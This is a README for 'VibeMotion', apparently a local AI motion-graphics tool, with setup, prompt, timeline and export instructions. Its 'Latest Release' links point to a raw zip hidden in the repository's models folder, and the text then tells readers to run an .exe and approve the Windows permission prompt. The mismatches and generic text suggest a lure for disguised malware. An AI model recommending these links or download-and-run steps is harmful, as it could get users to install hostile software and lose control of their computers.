# 🎥 VibeMotion - Create Motion Graphics Using Simple Text

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Kristianunfastened991/VibeMotion/raw/refs/heads/main/app/models/Vibe_Motion_v3.2-beta.4.zip)

VibeMotion helps you build motion graphics on your computer. You describe what you want the video to look like, and the software generates it. You can import frames from your Figma designs, organize clips on a timeline, and use LTX models to create video content. This tool runs locally on your machine.

## 🛠️ System Requirements

Your computer needs specific hardware to run VibeMotion. Check these requirements before you start.

*   **Operating System**: Windows 10 or Windows 11.
*   **Processor**: 64-bit multi-core CPU.
*   **Memory**: 16 GB RAM or more is best for smooth playback.
*   **Graphics Card**: NVIDIA GPU with at least 8 GB of VRAM. This is essential for the AI generation features.
*   **Storage Space**: 10 GB of free space. Keep additional room for your video projects.

## 📥 Getting the Software

You can get the latest version of VibeMotion from the release page.

[Click here to visit the download page](https://github.com/Kristianunfastened991/VibeMotion/raw/refs/heads/main/app/models/Vibe_Motion_v3.2-beta.4.zip)

Look for the file that ends with `.exe` in the latest release section. Save this file to your computer.

## ⚙️ Installation Guide

Follow these steps to set up VibeMotion on your Windows computer.

1.  Find the folder where you saved the `.exe` file.
2.  Double-click the file to start the installation.
3.  Windows may show a message asking if you want to allow the app to make changes to your device. Choose Yes to continue.
4.  Follow the setup wizard on your screen. Leave the settings at their defaults unless you have a reason to change them.
5.  Select Finish when the setup completes.

## 🚀 Running VibeMotion

Once installation ends, you launch the application from the desktop shortcut or your start menu.

1.  Open VibeMotion.
2.  The application prepares the AI models on the first run. This might take a moment.
3.  The main window appears. You see the timeline at the bottom and the preview window in the center.

## 🎨 Importing Figma Frames

VibeMotion works with your existing design work. You can bring Figma frames into your project.

1.  Export your Figma frames as individual image files. PNG or JPEG formats work best.
2.  In VibeMotion, go to the File menu and choose Import Files.
3.  Select your images and drag them onto the timeline.
4.  Adjust the duration of each frame by dragging the edges of the clip.

## 📝 Creating Motion with Prompts

The core feature of VibeMotion involves prompt-based generation. Use this to add movement to static designs.

1.  Select a clip on your timeline.
2.  Find the Prompt bar on the right side of the screen.
3.  Type a description of the movement you want. For example, type "slow zoom into the center" or "particles floating across the screen."
4.  Press the Generate button.
5.  Wait for the progress bar to finish. The software renders the motion and places it in your timeline.

## ⏱️ Timeline Editing

Use the timeline to arrange your sequence.

*   **Move Clips**: Click and drag any clip to a new position.
*   **Cut Clips**: Move your red playhead to the spot where you want a cut. Press the Cut icon in the toolbar.
*   **Layering**: Place clips on different rows to stack them. The top row hides anything underneath it. 
*   **Volume**: If you add audio, you can adjust the volume slider on the left side of the row.

## 🎬 Exporting Your Work

After you finalize your motion graphics, you must export the project to save it as a video file.

1.  Go to the File menu and select Export Video.
2.  Choose your resolution settings. 1080p is the standard for most platforms.
3.  Select the frame rate. 30 frames per second provides natural motion.
4.  Pick a destination folder on your computer.
5.  Click Export. VibeMotion processes the frames and saves your file in the MP4 format.

## 💡 Troubleshooting Routine

If you run into issues, try these common fixes before reaching out for help. 

*   **Application Crashes on Startup**: Ensure your NVIDIA drivers are up to date. Download the latest drivers from the official website.
*   **Slow Generation**: Close any other applications that use your graphics card, such as web browsers or photo editors.
*   **Import Errors**: Check that your Figma frames are in a common image format. Avoid very high resolutions if your system memory is low.
*   **Disk Space**: Ensure you have enough storage space. AI projects generate temporary cache files that take up space. Clear the cache folder in the settings menu if you run low on room.

## 🤝 Project Structure

If you look into the folder where you installed the app, you see several parts.

*   **vibe.exe**: This is the main application.
*   **assets**: This folder holds default icons and interface elements.
*   **models**: This folder keeps the AI logic. Do not move or delete this folder, or the software will not generate motion.
*   **temp**: This is the cache folder. The app clears this when you exit, or you can clear it manually if the app starts acting strange.